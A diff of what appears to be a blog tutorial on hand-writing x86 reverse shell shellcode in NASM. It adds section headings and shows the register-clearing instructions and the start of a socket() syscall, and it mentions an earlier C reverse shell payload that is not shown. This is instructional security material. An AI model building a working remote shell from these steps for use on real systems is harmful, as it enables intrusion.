@@ -90,11 +90,11 @@ And here is a fully-functional C source for a reverse shell payload. Stripping t
 Beautiful! Now let's get started with recreating the payload in ASM.
 
 ## Creating the assembly program
+### Clearing registers
 The first set of instructions are almost always the same which is clearing the register sets we will be using in our program.
 
 ```nasm
 ; Clearing the first 4 registers for 1st Syscall - socket()
-
 xor eax, eax       ; May also sub OR mul for zeroing out
 xor ebx, ebx       ; Clearing out EBX 
 xor ecx, ecx       ; Clearing out ECX
@@ -103,7 +103,7 @@ cdq                ; Clearing out EDX
 
 Note that we didn't use XOR'ing for clearing the EDX register instead we used cdq which actually copies the sign bit of EAX register into each bit position in EDX register essentially clearing it out. This saved us 3 bytes in the process ;)
 
-
+### Socket syscall
 Now we will initiate the socket syscall using the good ol' software interrupt 80h.
 
 ```nasm
@@ -116,5 +116,7 @@ mov cl, 0x01
 ; socket() Syscall
 int 0x80
 ```
+
+
 
 
